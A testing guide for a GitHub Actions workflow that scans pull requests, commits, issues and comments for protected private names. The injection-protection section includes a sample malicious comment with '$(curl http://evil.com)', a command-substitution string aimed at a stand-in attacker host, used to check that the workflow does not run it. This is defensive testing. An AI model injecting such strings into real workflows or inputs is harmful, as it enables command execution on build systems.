# Testing the Private Name Check Workflow

## Local Testing

The test harness validates all scanning logic without requiring GitHub Actions:

```bash
bash scripts/test-private-name-check.sh
```

This tests:
- Secret presence detection
- File path/content scanning
- PR title/body/commit scanning
- Issue/comment scanning
- Script injection protection

All tests use dummy names (`DUMMYNAME`, `TESTNAME`) and verify correct behavior.

## GitHub Actions Testing

### Testing Secret-Missing Behavior (Current State)

The workflow is currently deployed to PR #148. Since the `PROTECTED_NAMES` secret is not yet configured, you can observe the fail-closed behavior:

1. Visit: https://github.com/threshi-art/infinity-enterprises-site/pull/148
2. Check the workflow run: https://github.com/threshi-art/infinity-enterprises-site/actions/workflows/private-name-check.yml
3. Observe:
   - ✅ "Check Secret Presence" completes successfully
   - ✅ "Scan PR Diff and Metadata" shows green with message "skipped: names secret missing"
   - ⚪ Actual scan job is skipped (grey), not green
   - The check summary displays the skip message clearly

### Testing Secret-Present Behavior

To test with the secret configured, the repository owner must:

1. **Configure the Secret**
   - Navigate to: Settings → Secrets and variables → Actions
   - Click "New repository secret"
   - Name: `PROTECTED_NAMES`
   - Value: `DUMMYNAME|TESTNAME` (or any test values)
   - Click "Add secret"

2. **Create a Test PR**
   
   Create a new branch with a test file:
   ```bash
   git checkout -b test-private-name-detection
   
   # Test file path detection
   echo "test" > DUMMYNAME_file.txt
   git add DUMMYNAME_file.txt
   git commit -m "Test: file path with protected name"
   
   # Test file content detection
   echo "const author = 'DUMMYNAME';" > test-content.js
   git add test-content.js
   git commit -m "Test: file content with protected name"
   
   # Test commit message detection
   echo "change" > test.txt
   git add test.txt
   git commit -m "Update by DUMMYNAME"
   
   git push origin test-private-name-detection
   ```

3. **Create PR with Protected Name in Title or Body**
   - Title: "Test: DUMMYNAME feature"
   - Body: "This PR tests detection of TESTNAME in the description"

4. **Verify Detection**
   
   The workflow should:
   - ✅ Complete successfully (report-only, does not fail)
   - ⚠️ Show warnings for each detected location:
     - File path: `DUMMYNAME_file.txt`
     - File content: `test-content.js:1`
     - Commit: `<commit SHA>`
     - PR title: "Possible protected name in PR title"
     - PR body: "Possible protected name in PR body"
   - 📊 Generate a summary showing findings count per category
   - 🔒 Never print the actual matched text

5. **Verify Job Summary**
   
   Click "Details" on the workflow run and check the job summary shows:
   ```
   # Private Name Check Report
   
   **Status:** Report-only (not a required check)
   
   - ⚠️ File paths: 1 finding(s)
   - ⚠️ File contents: 1 finding(s)
   - ⚠️ PR title: finding detected
   - ⚠️ PR body: finding detected
   - ⚠️ Commit messages: 1 finding(s)
   
   **Total findings:** 5
   
   See workflow annotations for specific locations.
   Matched text is never printed for privacy.
   ```

### Testing Issue/Comment Detection

1. **Test Issue Creation**
   - Create a new issue with title: "Bug: DUMMYNAME component broken"
   - Body: "The TESTNAME system is not working"
   - Verify:
     - ⚠️ Workflow runs and detects names in title and body
     - 🏷️ `needs-name-scrub` label is automatically added
     - 📝 Warnings show issue number only, not matched text

2. **Test Comment Detection**
   - Add a comment to any issue: "Update from DUMMYNAME"
   - Verify:
     - ⚠️ Workflow detects name in comment
     - 🏷️ Label is added if not already present
     - 📝 Warning shows issue and comment ID only

### Testing Script Injection Protection

The workflow is designed to prevent script injection attacks. To verify:

1. **Create Malicious Comment**
   ```
   This is a normal comment with DUMMYNAME and $(curl http://evil.com)
   ```

2. **Verify Safe Handling**
   - The workflow should detect `DUMMYNAME` correctly
   - The injection string `$(curl ...)` should NOT execute
   - Only the finding location is logged, never the full text

## Validation Checklist

After the secret is configured and testing is complete, verify:

- [ ] Secret missing → scan skipped (grey), not green
- [ ] Secret present → scan runs
- [ ] File paths detected correctly
- [ ] File contents detected correctly (added lines only)
- [ ] PR title/body detected correctly
- [ ] Commit messages detected correctly
- [ ] Issue title/body detected correctly
- [ ] Comments detected correctly
- [ ] `needs-name-scrub` label applied to issues
- [ ] Matched text is NEVER echoed in logs, warnings, or summaries
- [ ] Only file:line, commit SHA, or issue/comment numbers are shown
- [ ] Script injection attempts are blocked
- [ ] Check remains report-only (does not fail the PR)
- [ ] Job summaries are clear and actionable

## Cleanup After Testing

After validating the workflow:

1. Close and delete the test PR
2. Delete the test branch: `git branch -D test-private-name-detection`
3. Remove test issues/comments
4. Remove the `DUMMYNAME|TESTNAME` secret (or wait for owner to replace with real values)
5. Remove the `needs-name-scrub` label from any test issues

## Production Deployment

Once testing is complete and the workflow is merged to `studio`:

1. Owner configures the real `PROTECTED_NAMES` secret (real protected names, pipe-separated)
2. Workflow runs on all PRs and issues going forward
3. Observe for a clean period (one week recommended in #131)
4. After observation period, promote to required check in branch protection (separate task)
5. Wiki scanning can be added in a follow-up PR (gollum event handler)
